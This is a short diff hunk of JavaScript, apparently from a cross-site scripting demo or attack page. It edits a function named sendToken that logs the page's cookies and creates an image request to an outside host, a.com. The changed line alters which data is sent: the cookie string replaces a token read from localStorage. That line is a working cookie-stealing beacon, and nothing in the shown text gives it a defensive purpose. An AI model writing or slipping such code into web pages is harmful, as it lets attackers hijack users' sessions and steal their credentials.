@@ -29,7 +29,7 @@
 		function sendToken(){
 			console.log(document.cookie);
 			var img=new Image();
-			img.src='http://a.com?token='+ localStorage.getItem("token");
+			img.src='http://a.com?token='+ document.cookie;
 			
 
 			// img.onerror=function(){
